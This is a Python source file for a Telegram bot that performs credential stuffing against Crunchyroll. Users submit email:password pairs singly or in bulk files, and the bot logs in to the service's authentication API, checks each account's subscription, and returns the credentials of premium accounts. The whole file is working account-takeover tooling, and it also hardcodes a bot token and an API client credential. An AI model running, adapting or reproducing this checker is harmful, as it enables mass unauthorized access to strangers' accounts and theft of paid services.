import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import aiohttp
import asyncio
import uuid
import urllib.parse
import threading

# Initialize the bot with your token
bot_token = "7468947655:AAGKq2f_dxG0-31WCWKQHWbIYY8-twG7lDE"
bot = telebot.TeleBot(bot_token)

# Headers and API details for Crunchyroll
api_url = "https://beta-api.crunchyroll.com/auth/v1/token"
headers = {
    'authorization': 'Basic d2piMV90YThta3Y3X2t4aHF6djc6MnlSWlg0Y0psX28yMzRqa2FNaXRTbXNLUVlGaUpQXzU=',
    'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
    'accept-encoding': 'gzip',
}

# Country codes dictionary (Add more as needed)
country_codes = {
    "AF": "Afghanistan 🇦🇫", "AX": "Åland Islands 🇦🇽", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
    # ... (rest of the country codes)
}

# Dictionary to track ongoing processes
user_processing_state = {}

# Start Command
@bot.message_handler(commands=["start"])
def send_welcome(message):
    bot.reply_to(
        message,
        (
            "Welcome to the *Crunchy Bot!*\n\n"
            "*Commands:*\n"
            "*/check email:password* - Check a single account\n"
            "*/mass* - Upload a .txt file with email:password pairs for bulk checking\n"
            "*/stop* - Stop the ongoing process\n\n"
            "*The bot will only send results for Premium accounts.*"
        ),
        parse_mode="Markdown",
    )

# Stop Command
@bot.message_handler(commands=["stop"])
def handle_stop(message):
    user_id = message.chat.id
    if user_id in user_processing_state:
        user_processing_state[user_id] = False
        bot.send_message(user_id, "🛑 Process stopped successfully!")
    else:
        bot.send_message(user_id, "⚠️ No process is running to stop.")

# Function to Check Single Email:Password (Asynchronous)
async def check_account(session, email, password):
    guid = str(uuid.uuid4())  # Generate unique device ID
    encoded_email = urllib.parse.quote_plus(email)
    encoded_password = urllib.parse.quote_plus(password)

    # Prepare request body
    data = f"username={encoded_email}&password={encoded_password}&grant_type=password&scope=offline_access&device_id={guid}&device_name=SM-G988N&device_type=samsung%20SM-G977N"

    try:
        # Make the API call
        async with session.post(api_url, data=data, headers=headers) as response:
            if response.status == 401:
                return "bad"  # Login failed

            json_response = await response.json()
            access_token = json_response.get("access_token")
            account_id = json_response.get("account_id")
            if not access_token or not account_id:
                return "bad"

            # Check subscription details
            account_url = "https://beta-api.crunchyroll.com/accounts/v1/me"
            account_headers = {
                'authorization': f"Bearer {access_token}",
                'accept-encoding': 'gzip',
            }
            async with session.get(account_url, headers=account_headers) as account_response:
                account_data = await account_response.json()

                # Get subscription country
                subscription_country = account_data.get("subscription_country", "Unknown")
                country_name = country_codes.get(subscription_country, "Unknown Country")

                if "subscription.not_found" in await account_response.text():
                    return "bad"  # Not a premium account

                return f"✅ *Premium Account Found!*\n- *Combo*: `{email}:{password}`\n"
    except Exception:
        return "bad"

# Single Check Command
@bot.message_handler(commands=["check"])
def handle_check(message):
    try:
        args = message.text.split(" ", 1)[1]
        email, password = args.split(":")
        # Run the check in a separate thread
        threading.Thread(target=run_check, args=(message.chat.id, email, password)).start()
    except IndexError:
        bot.send_message(message.chat.id, "Invalid format. Use `/check email:password`.", parse_mode="Markdown")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}", parse_mode="Markdown")

def run_check(chat_id, email, password):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(check_account(aiohttp.ClientSession(), email, password))
    if result != "bad":
        bot.send_message(chat_id, result, parse_mode="Markdown")
    else:
        bot.send_message(chat_id, "❌ No Premium Account Found.", parse_mode="Markdown")

# Mass Check Command
@bot.message_handler(commands=["mass"])
def handle_mass_check_prompt(message):
    bot.reply_to(message, "Please upload a `.txt` file with email:password pairs, one per line.")

@bot.message_handler(content_types=["document"])
def handle_file_upload(message):
    try:
        # Download the uploaded file
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        # Decode and split file content
        content = downloaded_file.decode("utf-8")
        pairs = [line.strip() for line in content.splitlines() if line.strip()]

        user_id = message.chat.id
        total_accounts = len(pairs)

        # Initialize processing state
        user_processing_state[user_id] = True

        # Initialize Inline Keyboard with Stop Button
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton(f"Total: {total_accounts}", callback_data="total"),
            InlineKeyboardButton(f"Premium: 0", callback_data="premium"),
            InlineKeyboardButton(f"Bad: 0", callback_data="bad"),
            InlineKeyboardButton("🛑 Stop", callback_data="stop"),
        )
        sent_message = bot.send_message(message.chat.id, "🔄 Processing accounts...", reply_markup=markup)

        # Start a new thread for mass checking
        threading.Thread(target=run_mass_check, args=(user_id, pairs, sent_message)).start()

    except Exception as e:
        bot.send_message(message.chat.id, f"Error processing file: {str(e)}", parse_mode="Markdown")

async def mass_check(user_id, pairs, sent_message):
    total_accounts = len(pairs)
    premium_accounts = 0
    bad_accounts = 0

    # Limit concurrency to avoid overwhelming the API
    semaphore = asyncio.Semaphore(10)  # Adjust this value based on API rate limits

    async def process_pair(pair):
        nonlocal premium_accounts, bad_accounts
        async with semaphore:
            if not user_processing_state.get(user_id, False):
                return

            try:
                email, password = pair.split(":")
                result = await check_account(aiohttp.ClientSession(), email, password)
                if result == "bad":
                    bad_accounts += 1
                else:
                    premium_accounts += 1
                    bot.send_message(user_id, result, parse_mode="Markdown")

                # Update Inline Keyboard
                markup = InlineKeyboardMarkup(row_width=2)
                markup.add(
                    InlineKeyboardButton(f"Total: {total_accounts}", callback_data="total"),
                    InlineKeyboardButton(f"Premium: {premium_accounts}", callback_data="premium"),
                    InlineKeyboardButton(f"Bad: {bad_accounts}", callback_data="bad"),
                    InlineKeyboardButton("🛑 Stop", callback_data="stop"),
                )
                bot.edit_message_reply_markup(
                    chat_id=user_id,
                    message_id=sent_message.message_id,
                    reply_markup=markup,
                )
            except ValueError:
                pass  # Skip invalid formats

    # Run all pairs concurrently
    tasks = [process_pair(pair) for pair in pairs]
    await asyncio.gather(*tasks)

    if user_processing_state.get(user_id, False):
        bot.send_message(user_id, "✅ Bulk checking completed.")
    else:
        bot.send_message(user_id, "🛑 Process stopped by user.")
    user_processing_state.pop(user_id, None)

def run_mass_check(user_id, pairs, sent_message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(mass_check(user_id, pairs, sent_message))

# Callback Query Handler for Inline Buttons
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.message.chat.id
    if call.data == "stop":
        if user_id in user_processing_state:
            user_processing_state[user_id] = False
            bot.answer_callback_query(call.id, "🛑 Process stopped successfully!")
        else:
            bot.answer_callback_query(call.id, "⚠️ No process is running to stop.")

# Run Bot Polling
bot.polling()
